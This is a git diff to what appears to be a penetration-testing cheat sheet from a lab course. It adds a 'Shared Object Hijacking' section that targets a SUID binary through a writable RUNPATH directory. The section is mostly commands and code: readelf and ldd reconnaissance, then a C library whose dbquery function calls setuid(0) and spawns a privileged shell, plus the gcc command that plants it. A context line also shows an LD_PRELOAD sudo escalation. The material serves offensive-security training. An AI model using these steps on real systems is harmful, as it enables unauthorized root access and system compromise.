@@ -1009,8 +1009,45 @@ We can now use this shared object file when launching any program our user can r
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
 ### Shared Object Hijacking
-```
+>Potential Target: SUID Binary payroll  
 
+Displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.
+```
+ldd binary
+```
+Libraries in RUNPATH are given preference over other folders
+```
+htb-student@NIX02:~$ readelf -d payroll  | grep PATH
+
+0x000000000000001d (RUNPATH)            Library runpath: [/development]
+```
+Before compiling a library, we need to find the function name called by the binary.
+```
+htb-student@NIX02:~$ ldd payroll
+
+linux-vdso.so.1 (0x00007ffd22bbc000)
+libshared.so => /development/libshared.so (0x00007f0c13112000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
+
+htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+htb-student@NIX02:~$ ./payroll 
+
+./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
+```
+Compile a shared object which includes dbquery function
+```
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+}
+
+gcc src.c -fPIC -shared -o /development/libshared.so
+./payroll
 ```
 ### Postgresql to RCE
 ```
